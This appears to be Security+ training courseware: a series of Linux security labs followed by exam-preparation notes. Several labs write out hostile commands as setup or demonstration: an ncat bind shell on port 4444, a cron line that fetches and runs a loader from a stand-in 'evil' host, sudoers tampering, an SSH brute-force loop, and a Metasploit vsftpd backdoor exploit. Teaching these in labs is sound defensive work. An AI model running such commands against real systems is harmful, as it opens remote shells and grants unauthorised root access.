/etc/sudoers LAB_NORMAL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Initialise the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aideinit -y -f &amp;&amp; mv /var/lib/aide/aide.db.new /var/lib/aide/aide.db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clean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aide --check | head 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Tamper and re-check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'# tampered' &gt;&gt; /etc/sudoers; useradd -m attacker; aide --check 2&gt;&amp;1 | head -25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Roll the baseline forward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aide --update -B 'database_new=file:/var/lib/aide/aide.db.new' &amp;&amp; mv /var/lib/aide/aide.db.new /var/lib/aide/aide.db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Schedule a daily check to syslog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/etc/cron.daily/aide-check &lt;&lt;'EOF'
#!/bin/sh
/usr/bin/aide --check | logger -t aide
EOF
chmod +x /etc/cron.daily/aide-check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tampering, aide --check reports the changed sudoers and new user; a clean baseline reports none.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Scan an OS, filesystem, and container image with Trivy and export a CVSS-sorted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Trivy scanning pipeline producing a prioritised remediation queue.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trivy, jq, docker.io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Trivy repo and install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wget -qO - https://aquasecurity.github.io/trivy-repo/deb/public.key | gpg --dearmor &gt; /usr/share/keyrings/trivy.gpg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Register the generic repo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'deb [signed-by=/usr/share/keyrings/trivy.gpg] https://aquasecurity.github.io/trivy-repo/deb generic main' &gt; /etc/apt/sources.list.d/trivy.list &amp;&amp; apt update &amp;&amp; apt install -y trivy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the running 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trivy rootfs --scanners vuln --severity HIGH,CRITICAL / 2&gt;/dev/null | tail -40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Export findings to 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trivy rootfs --severity HIGH,CRITICAL --format json -o trivy.json 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a container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pull node:14-alpine &amp;&amp; trivy image --severity HIGH,CRITICAL node:14-alpine | head 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CVSS-sorted patch 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trivy image --format json node:14-alpine | jq -r '.Results[].Vulnerabilities[]? | [.VulnerabilityID, .Severity, (.CVSS.nvd.V3Score // 0)] | @tsv' | sort -k3,3 -nr | head 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for hardcoded secrets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trivy fs --scanners secret src/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Trivy lists HIGH/CRITICAL CVEs, produces a CVSS-sorted top-10, and flags the planted AWS secret.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Simulate a compromise then work the NIST IR phases, preserving evidence with SHA-256 hashes.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full triage-to-report incident workflow on a simulated compromise.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ncat, ss, ps, crontab, sha256sum, iptables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Prepare an evidence drop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/evidence/$(date +%Y%m%d) &amp;&amp; cd /evidence/$(date +%Y%m%d)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Plant the compromise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apt-get install -y ncat; nohup ncat -lk 4444 -e /bin/bash &amp; echo '* * * * * curl -s http://evil/loader.sh | sh' | crontab -u attacker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Detect indicators of compromise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 -tlnp | grep 4444; ps -ef | grep -E 'ncat|bash'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Collect volatile evidence and hash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ps auxf &gt; ps.txt; ss -tnp &gt; sockets.txt; sha256sum *.txt *.log &gt; evidence.sha256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Contain the incident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-I INPUT -p tcp --dport 4444 -j DROP; usermod -L attacker; pkill -u attacker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Eradicate the threat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crontab -u attacker -r; pkill ncat; userdel -rf attacker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Validate recovery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 -tlnp | grep 4444 || echo 'no backdoor listener'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295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the incident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report.md &lt;&lt;EOF
# Incident report
EOF
sha256sum report.md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296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listener/user/cron are gone at recovery and evidence.sha256 re-verifies with no tampering.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297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Write a bash SOAR playbook that watches auth.log, auto-bans IPs, opens tickets, and logs.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systemd-managed mini-SOAR service auto-banning brute-force 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bash, awk, iptables, systemd, logger, inotify-tools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298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inotify-tools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inotify-tools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299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the SOAR playbook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/usr/local/bin/soar.sh &lt;&lt;'EOF'
#!/bin/bash
tail -F /var/log/auth.log | while read -r line; do ...; done
EOF
chmod +x /usr/local/bin/soar.sh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it as a systemd unit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/etc/systemd/system/soar.service &lt;&lt;'EOF'
[Service]
ExecStart=/usr/local/bin/soar.sh
Restart=always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the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daemon-reload &amp;&amp; systemctl enable --now soar.service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302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brute-force traffic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$(seq 1 6); do ssh -o PubkeyAuthentication=no bad@127.0.0.1 2&gt;/dev/null;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303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Observe tickets, bans, and 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 /var/tickets/; iptables -L INPUT -n | head; journalctl -t soar -n 5 --no-pager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304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an API escalation hook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-X POST https://hooks.slack.com/services/... -d '...'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305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ticket JSON is created, the source IP is DROPped in iptables, and a soar syslog entry appears.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306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Security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Harden SSH to key-only auth and auto-ban brute-force IPs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Model RBAC with groups, scope sudo per role, add PAM controls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Add a TOTP second factor to SSH via a PAM module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Stand up a single-node SIEM and pivot from an alert to an IP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Run Suricata IDS, load rules, and write a custom signature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Query the host with SQL and schedule detections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Baseline critical files and detect tampering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Scan OS, filesystem, and image and prioritise by CVSS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307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Program Management &amp; Oversight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Risk &amp; CVSS · OSINT · Nmap · Pentesting · Compliance · Awareness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308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Security Program Management &amp; Oversight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Risk management records threats in a register, scores them (CVSS, likelihood × impact) and drives treatment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Reconnaissance — passive OSINT and active scanning with Nmap — maps an organisation's exposure the way an attacker would.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Penetration testing safely validates exploitability; every engagement needs authorisation and Rules of Engagement.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Governance proves control effectiveness through compliance auditing (OpenSCAP/CIS) and measurable security-awareness testing.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309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Security Program Management &amp; Oversight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31–32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Risk Register, CVSS Scoring, and Quantitative Risk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Passive Reconnaissance / OSINT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33–34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Active Reconnaissance with Nmap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Penetration Testing with Metasploit (Authorised Lab)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35–36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Compliance Audit with OpenSCAP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Security Awareness: Run a Phishing Simulation with GoPhish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310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 CSV risk register, score findings with CVSS v3.1, and calculate ALE to justify control spend.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CSV risk register with CVSS and ALE math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python3, FIRST.org CVSS calculator, column, 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311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Risk Register, CVSS Scoring, and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and view the CSV risk register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column -t -s, risk-register.csv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312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Risk Register, CVSS Scoring, and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Score R-001 on the FIRST.org CVSS v3.1 calculator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https://www.first.org/cvss/calculator/3.1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313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Risk Register, CVSS Scoring, and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Compute SLE and ALE in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python3 -c "print(200000*0.6*0.5)"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314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Risk Register, CVSS Scoring, and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Choose a risk treatment (mitigate vs accept)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315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Risk Register, CVSS Scoring, and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Key Risk Indicators to a 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column -t -s, kri.csv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316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Risk Register, CVSS Scoring, and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the one-page board risk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board-report.md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317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Python output shows ALE 60,000/year and board-report.md lists 4 open risks.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318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Gather a domain's public footprint with passive OSINT tools that never send packets to the target.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Passive recon report of an authorised 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whois, dnsutils, theHarvester, subfinder, jq, crt.sh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319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theHarvester and subfinder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pip3 install --break-system-packages git+https://github.com/laramies/theHarvester.git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320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the authorised target domain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TARGET=example.com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321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Query WHOIS registrant and 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whois $TARGET | grep -Ei "registrar|registrant|expiry|name server"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322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Enumerate DNS records (MX, TXT, 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+short MX $TARGET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323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Discover subdomains passively with subfinder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subfinder -silent -d $TARGET | tee subs.txt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324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Harvest emails and hosts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theHarvester -d $TARGET -b crtsh,duckduckgo,bing 2&gt;/dev/null | tail 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325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Pull certificate transparency records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"https://crt.sh/?q=%25.$TARGET&amp;output=json" | jq -r '.[].name_value' | sort -u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326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the recon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recon-$TARGET.md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327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recon-example.com.md lists the subdomain count plus DMARC and SPF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328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Fingerprint a local host with Nmap host discovery, version detection, OS detection, and NSE scripts.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Nmap scan of local nginx and SSH targets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nmap, nginx, openssh-server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329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nmap and start nginx + ssh targets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nmap nginx openssh-server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Discover live hosts with a ping scan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-sn 127.0.0.0/30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331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TCP SYN half-open scan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-sS -p 1-1024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332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Detect service versions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-sV -p 22,80 127.0.0.1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333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Fingerprint the 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-O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334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NSE discovery scripts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--script=banner,http-headers,ssh2-enum-algos -p 22,80 127.0.0.1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335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vulnerability NSE scripts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--script=vuln -p 80 127.0.0.1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336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results in three report formats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-sV -oA scan-127 127.0.0.1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337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nmap -sV reports nginx on port 80 and OpenSSH on port 22, and scan-127.xml is written.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338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Exploit a deliberately vulnerable vsftpd service with Metasploit, prove compromise, then write the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Metasploit exploit of a lab FTP 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metasploit-framework, docker.io, nmap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339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Metasploit via the Rapid7 installer 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-sSL https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; /tmp/msfinstall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340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Stand up the vulnerable FTP target in Docker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run -d --name vuln -p 2121:21 --rm tleemcjr/metasploitable2 /bin/bash -c "service vsftpd start &amp;&amp; sleep infinity"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341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Recon the target service banner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-sV -p 2121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342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Search Metasploit for matching modules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msfconsole -q -x "search vsftpd; exit"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343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vsftpd backdoor exploit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msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 127.0.0.1; set RPORT 2121; exploit -z; exit"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344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Collect post-exploitation proof (id, uname)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sessions -i 1 -c 'id; uname -a; whoami; hostname'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345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Clean up the target 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rm -f vuln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346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the engagement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pentest-report.md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347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command session opens and `id` returns uid=0(root) from the target container.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348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Audit an Ubuntu host against a CIS profile with OpenSCAP, produce the HTML report, and remediate a control.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OpenSCAP CIS compliance scan and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openscap-scanner/libopenscap8, ssg-base, ssg-debderived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349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Compliance Audit with OpenSCAP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SSG content and OpenSCAP scanner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openscap-scanner || apt install -y libopenscap8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350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Compliance Audit with OpenSCAP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Select the Ubuntu SCAP datastream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DS=$(ls /usr/share/xml/scap/ssg/content/ssg-ubuntu*-ds.xml | head -1)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351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Compliance Audit with OpenSCAP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available compliance profiles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oscap info $DS | grep -A1 Profile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352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Compliance Audit with OpenSCAP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CIS Level 1 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oscap xccdf eval --profile xccdf_org.ssgproject.content_profile_cis_level1_server --results-arf arf.xml --report report.html $DS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353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Compliance Audit with OpenSCAP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the auto-remediation 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oscap xccdf generate fix --profile xccdf_org.ssgproject.content_profile_cis_level1_server --output remediate.sh $DS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354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Compliance Audit with OpenSCAP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one fix and re-check the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oscap xccdf eval --rule xccdf_org.ssgproject.content_rule_package_telnet_removed $DS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355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report.html shows pass/fail per control and the score rises after remediation.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356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Run a controlled phishing simulation with GoPhish and a MailHog sink, tracking click and open metrics.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GoPhish campaign with a MailHog SMTP sink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gophish, docker.io, mailhog, curl, unzip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357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Download and unzip the GoPhish binary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-LO https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip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358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Bind the admin UI to all interfaces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's/127.0.0.1:3333/0.0.0.0:3333/' config.json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359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Start GoPhish and note the admin password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./gophish 2&gt;&amp;1 | grep -E "admin|password" | head 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360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Spin up the MailHog SMTP sink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run -d -p 1025:1025 -p 8025:8025 mailhog/mailhog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361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the four GoPhish primitives in the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362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Launch the campaign and watch the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363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click rates to training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364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campaign dashboard tracks sent/opened/clicked and test emails appear in MailHog.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365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Security Program Management &amp; Oversight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Build a risk register and score with CVSS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Collect a domain footprint using only passive tools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Fingerprint a host with Nmap scans and NSE scripts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Exploit a vulnerable target and write the report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Scan a host against a CIS profile and remediate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Operate a phishing simulation end-to-end with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366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367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General Concepts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Categorised controls; applied CIA, AAA, hashing, encryption and PKI.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Threats &amp; Vulns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Analysed phishing, cracked passwords, exploited SQLi/XSS, scanned and hardened.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Architecture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Segmented networks; deployed firewalls, WAF, VPN, disk &amp; TLS encryption and backup.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Hardened access; ran SIEM, IDS, EDR, FIM, vuln management, IR and automation.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Program Mgmt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Scored risk with CVSS; ran recon, pentesting, compliance and awareness testing.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368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Preparing for the SY0-701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Redo every lab until the commands and concepts are automatic.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Review the 'What you learned' notes in each lab and the Learner Guide.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Memorise the control categories/types, the CIA triad and the CVSS metrics.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SY0-701 exam is up to 90 questions in 90 minutes; passing score is 750/900.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Book the exam through Pearson VUE from your CompTIA account.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369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TEST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Sharpen your exam readiness with the Tertiary Infotech Security+ practice exam.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Practice exam: https://exams.tertiaryinfotech.com/practice-exams/comptia/comptia-security-plus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Attempt it under timed conditions and review every explanation.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Revisit any lab whose topic you miss, then re-take the practice exam.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370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Download the slides and Learner Guide from the LMS at https://lms-tms.tertiaryinfotech.com/.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Written Assessment (WA) and Practical Performance (PP) on the LMS.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Keep the courseware open during the assessment — it is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371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(SAQ) — 6 questions, 1 hour.  Practical Performance (PP) — 5 tasks, 1 hour.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372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Take the Assessment digital attendance (TRAQOM · SSG QR on the LMS)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— 6 questions, open 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PP — 5 hands-on tasks,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373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374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STAY SECURE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secure Linux systems — and to sit the CompTIA Security+ SY0-701 exam.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